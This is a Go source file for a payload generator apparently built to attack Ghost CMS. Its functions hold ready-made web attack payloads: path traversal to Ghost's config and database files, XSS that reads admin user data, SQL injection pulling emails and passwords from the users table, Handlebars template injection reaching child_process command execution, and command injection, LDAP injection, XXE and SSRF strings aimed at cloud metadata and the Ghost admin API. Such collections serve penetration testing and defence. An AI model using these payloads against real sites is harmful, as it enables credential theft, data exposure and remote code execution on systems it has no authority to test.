package payloads

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

// PayloadGenerator generates various payloads for Ghost CMS testing
type PayloadGenerator struct {
	random *rand.Rand
}

// PayloadType represents different types of payloads
type PayloadType string

const (
	PathTraversal     PayloadType = "path_traversal"
	XSS              PayloadType = "xss"
	SQLInjection     PayloadType = "sql_injection"
	TemplateInjection PayloadType = "template_injection"
	CommandInjection  PayloadType = "command_injection"
	LDAP             PayloadType = "ldap_injection"
	XXE              PayloadType = "xxe"
	SSRF             PayloadType = "ssrf"
)

// Payload represents a generated payload
type Payload struct {
	Type        PayloadType `json:"type"`
	Name        string      `json:"name"`
	Payload     string      `json:"payload"`
	Description string      `json:"description"`
	Severity    string      `json:"severity"`
	Context     string      `json:"context"`
	Encoded     bool        `json:"encoded"`
}

// NewPayloadGenerator creates a new payload generator
func NewPayloadGenerator() *PayloadGenerator {
	return &PayloadGenerator{
		random: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

// GeneratePayloads generates payloads for a specific type
func (pg *PayloadGenerator) GeneratePayloads(payloadType PayloadType) []Payload {
	switch payloadType {
	case PathTraversal:
		return pg.generatePathTraversalPayloads()
	case XSS:
		return pg.generateXSSPayloads()
	case SQLInjection:
		return pg.generateSQLInjectionPayloads()
	case TemplateInjection:
		return pg.generateTemplateInjectionPayloads()
	case CommandInjection:
		return pg.generateCommandInjectionPayloads()
	case LDAP:
		return pg.generateLDAPInjectionPayloads()
	case XXE:
		return pg.generateXXEPayloads()
	case SSRF:
		return pg.generateSSRFPayloads()
	default:
		return []Payload{}
	}
}

// generatePathTraversalPayloads generates path traversal payloads
func (pg *PayloadGenerator) generatePathTraversalPayloads() []Payload {
	payloads := []Payload{
		{
			Type:        PathTraversal,
			Name:        "Basic Unix Path Traversal",
			Payload:     "../../../etc/passwd",
			Description: "Basic path traversal to read /etc/passwd",
			Severity:    "High",
			Context:     "file_parameter",
		},
		{
			Type:        PathTraversal,
			Name:        "Windows Path Traversal",
			Payload:     "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
			Description: "Windows path traversal to read hosts file",
			Severity:    "High",
			Context:     "file_parameter",
		},
		{
			Type:        PathTraversal,
			Name:        "URL Encoded Path Traversal",
			Payload:     "..%2F..%2F..%2Fetc%2Fpasswd",
			Description: "URL encoded path traversal",
			Severity:    "High",
			Context:     "url_parameter",
			Encoded:     true,
		},
		{
			Type:        PathTraversal,
			Name:        "Double URL Encoded",
			Payload:     "..%252F..%252F..%252Fetc%252Fpasswd",
			Description: "Double URL encoded path traversal",
			Severity:    "High",
			Context:     "url_parameter",
			Encoded:     true,
		},
		{
			Type:        PathTraversal,
			Name:        "Ghost Config File",
			Payload:     "../../../config.production.json",
			Description: "Attempt to read Ghost configuration file",
			Severity:    "Critical",
			Context:     "ghost_specific",
		},
		{
			Type:        PathTraversal,
			Name:        "Ghost Database",
			Payload:     "../../../content/data/ghost.db",
			Description: "Attempt to read Ghost SQLite database",
			Severity:    "Critical",
			Context:     "ghost_specific",
		},
		{
			Type:        PathTraversal,
			Name:        "Ghost Logs",
			Payload:     "../../../content/logs/ghost.log",
			Description: "Attempt to read Ghost log files",
			Severity:    "Medium",
			Context:     "ghost_specific",
		},
	}

	return payloads
}

// generateXSSPayloads generates XSS payloads
func (pg *PayloadGenerator) generateXSSPayloads() []Payload {
	payloads := []Payload{
		{
			Type:        XSS,
			Name:        "Basic Script Alert",
			Payload:     "<script>alert('XSS')</script>",
			Description: "Basic JavaScript alert payload",
			Severity:    "Medium",
			Context:     "html_context",
		},
		{
			Type:        XSS,
			Name:        "Image Onerror",
			Payload:     "<img src=x onerror=alert('XSS')>",
			Description: "Image tag with onerror event",
			Severity:    "Medium",
			Context:     "html_context",
		},
		{
			Type:        XSS,
			Name:        "SVG XSS",
			Payload:     "<svg onload=alert('XSS')></svg>",
			Description: "SVG-based XSS payload",
			Severity:    "Medium",
			Context:     "html_context",
		},
		{
			Type:        XSS,
			Name:        "JavaScript URL",
			Payload:     "javascript:alert('XSS')",
			Description: "JavaScript URL scheme",
			Severity:    "Medium",
			Context:     "url_context",
		},
		{
			Type:        XSS,
			Name:        "Event Handler",
			Payload:     "onmouseover=alert('XSS')",
			Description: "Event handler injection",
			Severity:    "Medium",
			Context:     "attribute_context",
		},
		{
			Type:        XSS,
			Name:        "Ghost Admin XSS",
			Payload:     "\"onmouseover=\"alert('Ghost Admin XSS')\"",
			Description: "XSS payload targeting Ghost admin interface",
			Severity:    "High",
			Context:     "ghost_admin",
		},
	}

	return payloads
}

// generateSQLInjectionPayloads generates SQL injection payloads
func (pg *PayloadGenerator) generateSQLInjectionPayloads() []Payload {
	payloads := []Payload{
		{
			Type:        SQLInjection,
			Name:        "Basic Union Select",
			Payload:     "' UNION SELECT 1,2,3--",
			Description: "Basic UNION SELECT injection",
			Severity:    "High",
			Context:     "string_parameter",
		},
		{
			Type:        SQLInjection,
			Name:        "Boolean Based",
			Payload:     "' AND 1=1--",
			Description: "Boolean-based blind SQL injection",
			Severity:    "High",
			Context:     "string_parameter",
		},
		{
			Type:        SQLInjection,
			Name:        "Time Based",
			Payload:     "'; WAITFOR DELAY '00:00:05'--",
			Description: "Time-based blind SQL injection",
			Severity:    "High",
			Context:     "string_parameter",
		},
		{
			Type:        SQLInjection,
			Name:        "SQLite Injection",
			Payload:     "' UNION SELECT sql FROM sqlite_master--",
			Description: "SQLite-specific injection for Ghost database",
			Severity:    "Critical",
			Context:     "ghost_database",
		},
		{
			Type:        SQLInjection,
			Name:        "Ghost Users Table",
			Payload:     "' UNION SELECT email,password FROM users--",
			Description: "Attempt to extract Ghost user credentials",
			Severity:    "Critical",
			Context:     "ghost_database",
		},
	}

	return payloads
}

// generateTemplateInjectionPayloads generates template injection payloads
func (pg *PayloadGenerator) generateTemplateInjectionPayloads() []Payload {
	payloads := []Payload{
		{
			Type:        TemplateInjection,
			Name:        "Handlebars Constructor",
			Payload:     "{{constructor.constructor('return process.env')()}}",
			Description: "Handlebars template injection to access process.env",
			Severity:    "Critical",
			Context:     "handlebars",
		},
		{
			Type:        TemplateInjection,
			Name:        "Handlebars Lookup",
			Payload:     "{{#each (lookup (lookup this 'constructor') 'constructor') }}{{this}}{{/each}}",
			Description: "Handlebars lookup-based injection",
			Severity:    "High",
			Context:     "handlebars",
		},
		{
			Type:        TemplateInjection,
			Name:        "Handlebars Command Execution",
			Payload:     "{{#with (lookup (lookup this 'constructor') 'constructor')}}{{call this 'return global.process.mainModule.require(\"child_process\").execSync(\"id\")'}}{{/with}}",
			Description: "Handlebars template injection for command execution",
			Severity:    "Critical",
			Context:     "handlebars",
		},
		{
			Type:        TemplateInjection,
			Name:        "Ghost Theme Injection",
			Payload:     "{{@site.url}}{{constructor.constructor('return process')()}}",
			Description: "Template injection in Ghost theme context",
			Severity:    "Critical",
			Context:     "ghost_theme",
		},
	}

	return payloads
}

// generateCommandInjectionPayloads generates command injection payloads
func (pg *PayloadGenerator) generateCommandInjectionPayloads() []Payload {
	payloads := []Payload{
		{
			Type:        CommandInjection,
			Name:        "Basic Command Injection",
			Payload:     "; id",
			Description: "Basic command injection using semicolon",
			Severity:    "Critical",
			Context:     "shell_command",
		},
		{
			Type:        CommandInjection,
			Name:        "Pipe Command Injection",
			Payload:     "| whoami",
			Description: "Command injection using pipe",
			Severity:    "Critical",
			Context:     "shell_command",
		},
		{
			Type:        CommandInjection,
			Name:        "Backtick Injection",
			Payload:     "`id`",
			Description: "Command injection using backticks",
			Severity:    "Critical",
			Context:     "shell_command",
		},
		{
			Type:        CommandInjection,
			Name:        "Node.js Process Injection",
			Payload:     "'; require('child_process').exec('id'); //",
			Description: "Node.js-specific command injection",
			Severity:    "Critical",
			Context:     "nodejs",
		},
	}

	return payloads
}

// generateLDAPInjectionPayloads generates LDAP injection payloads
func (pg *PayloadGenerator) generateLDAPInjectionPayloads() []Payload {
	payloads := []Payload{
		{
			Type:        LDAP,
			Name:        "LDAP Wildcard",
			Payload:     "*",
			Description: "LDAP wildcard injection",
			Severity:    "Medium",
			Context:     "ldap_filter",
		},
		{
			Type:        LDAP,
			Name:        "LDAP Boolean True",
			Payload:     "*)(&",
			Description: "LDAP injection to always return true",
			Severity:    "High",
			Context:     "ldap_filter",
		},
		{
			Type:        LDAP,
			Name:        "LDAP Admin Bypass",
			Payload:     "admin*)((|userPassword=*",
			Description: "LDAP injection for admin bypass",
			Severity:    "High",
			Context:     "ldap_authentication",
		},
	}

	return payloads
}

// generateXXEPayloads generates XXE payloads
func (pg *PayloadGenerator) generateXXEPayloads() []Payload {
	payloads := []Payload{
		{
			Type:        XXE,
			Name:        "Basic XXE",
			Payload:     "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
			Description: "Basic XXE to read local files",
			Severity:    "High",
			Context:     "xml_input",
		},
		{
			Type:        XXE,
			Name:        "XXE with Parameter Entity",
			Payload:     "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]><root></root>",
			Description: "XXE using parameter entities",
			Severity:    "High",
			Context:     "xml_input",
		},
		{
			Type:        XXE,
			Name:        "XXE SSRF",
			Payload:     "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><root>&test;</root>",
			Description: "XXE for SSRF to AWS metadata",
			Severity:    "High",
			Context:     "xml_input",
		},
	}

	return payloads
}

// generateSSRFPayloads generates SSRF payloads
func (pg *PayloadGenerator) generateSSRFPayloads() []Payload {
	payloads := []Payload{
		{
			Type:        SSRF,
			Name:        "AWS Metadata",
			Payload:     "http://169.254.169.254/latest/meta-data/",
			Description: "SSRF to AWS instance metadata",
			Severity:    "High",
			Context:     "url_parameter",
		},
		{
			Type:        SSRF,
			Name:        "Google Cloud Metadata",
			Payload:     "http://metadata.google.internal/computeMetadata/v1/",
			Description: "SSRF to Google Cloud metadata",
			Severity:    "High",
			Context:     "url_parameter",
		},
		{
			Type:        SSRF,
			Name:        "Localhost Bypass",
			Payload:     "http://127.0.0.1:22",
			Description: "SSRF to localhost services",
			Severity:    "Medium",
			Context:     "url_parameter",
		},
		{
			Type:        SSRF,
			Name:        "Internal Network Scan",
			Payload:     "http://192.168.1.1",
			Description: "SSRF for internal network reconnaissance",
			Severity:    "Medium",
			Context:     "url_parameter",
		},
		{
			Type:        SSRF,
			Name:        "Ghost Webhook SSRF",
			Payload:     "http://localhost:2368/ghost/api/v4/admin/",
			Description: "SSRF targeting Ghost admin API",
			Severity:    "High",
			Context:     "ghost_webhook",
		},
	}

	return payloads
}

// GenerateCustomPayload generates a custom payload based on parameters
func (pg *PayloadGenerator) GenerateCustomPayload(payloadType PayloadType, target string, context string) Payload {
	switch payloadType {
	case PathTraversal:
		return Payload{
			Type:        PathTraversal,
			Name:        "Custom Path Traversal",
			Payload:     fmt.Sprintf("../../../%s", target),
			Description: fmt.Sprintf("Custom path traversal to %s", target),
			Severity:    "High",
			Context:     context,
		}
	case XSS:
		return Payload{
			Type:        XSS,
			Name:        "Custom XSS",
			Payload:     fmt.Sprintf("<script>alert('%s')</script>", target),
			Description: fmt.Sprintf("Custom XSS payload for %s", target),
			Severity:    "Medium",
			Context:     context,
		}
	case SSRF:
		return Payload{
			Type:        SSRF,
			Name:        "Custom SSRF",
			Payload:     target,
			Description: fmt.Sprintf("Custom SSRF payload to %s", target),
			Severity:    "High",
			Context:     context,
		}
	default:
		return Payload{
			Type:        payloadType,
			Name:        "Custom Payload",
			Payload:     target,
			Description: fmt.Sprintf("Custom %s payload", payloadType),
			Severity:    "Medium",
			Context:     context,
		}
	}
}

// GetAllPayloadTypes returns all available payload types
func (pg *PayloadGenerator) GetAllPayloadTypes() []PayloadType {
	return []PayloadType{
		PathTraversal,
		XSS,
		SQLInjection,
		TemplateInjection,
		CommandInjection,
		LDAP,
		XXE,
		SSRF,
	}
}

// GenerateAllPayloads generates all available payloads
func (pg *PayloadGenerator) GenerateAllPayloads() map[PayloadType][]Payload {
	allPayloads := make(map[PayloadType][]Payload)
	
	for _, payloadType := range pg.GetAllPayloadTypes() {
		allPayloads[payloadType] = pg.GeneratePayloads(payloadType)
	}
	
	return allPayloads
}

// EncodePayload encodes a payload for different contexts
func (pg *PayloadGenerator) EncodePayload(payload string, encoding string) string {
	switch encoding {
	case "url":
		return strings.ReplaceAll(
			strings.ReplaceAll(
				strings.ReplaceAll(payload, "/", "%2F"),
				".", "%2E"),
			" ", "%20")
	case "double_url":
		return strings.ReplaceAll(
			strings.ReplaceAll(
				strings.ReplaceAll(payload, "/", "%252F"),
				".", "%252E"),
			" ", "%2520")
	case "html":
		return strings.ReplaceAll(
			strings.ReplaceAll(
				strings.ReplaceAll(
					strings.ReplaceAll(payload, "&", "&amp;"),
					"<", "&lt;"),
				">", "&gt;"),
			"\"", "&quot;")
	default:
		return payload
	}
}

// GetGhostSpecificPayloads returns Ghost CMS specific payloads
func (pg *PayloadGenerator) GetGhostSpecificPayloads() []Payload {
	ghostPayloads := []Payload{
		{
			Type:        PathTraversal,
			Name:        "Ghost Theme Path Traversal",
			Payload:     "../../../content/themes/casper/package.json",
			Description: "Path traversal to read Ghost theme files",
			Severity:    "High",
			Context:     "ghost_theme",
		},
		{
			Type:        TemplateInjection,
			Name:        "Ghost Handlebars Helper Injection",
			Payload:     "{{#get \"posts\" limit=\"all\"}}{{constructor.constructor('return process.env')()}}{{/get}}",
			Description: "Template injection in Ghost Handlebars helpers",
			Severity:    "Critical",
			Context:     "ghost_template",
		},
		{
			Type:        XSS,
			Name:        "Ghost Admin Panel XSS",
			Payload:     "<img src=x onerror=\"fetch('/ghost/api/v4/admin/users/me/',{credentials:'include'}).then(r=>r.json()).then(d=>alert(JSON.stringify(d)))\">",
			Description: "XSS to extract Ghost admin user data",
			Severity:    "High",
			Context:     "ghost_admin",
		},
		{
			Type:        SSRF,
			Name:        "Ghost Webhook SSRF",
			Payload:     "http://localhost:2368/ghost/api/v4/admin/db/",
			Description: "SSRF to access Ghost database API",
			Severity:    "Critical",
			Context:     "ghost_webhook",
		},
	}

	return ghostPayloads
}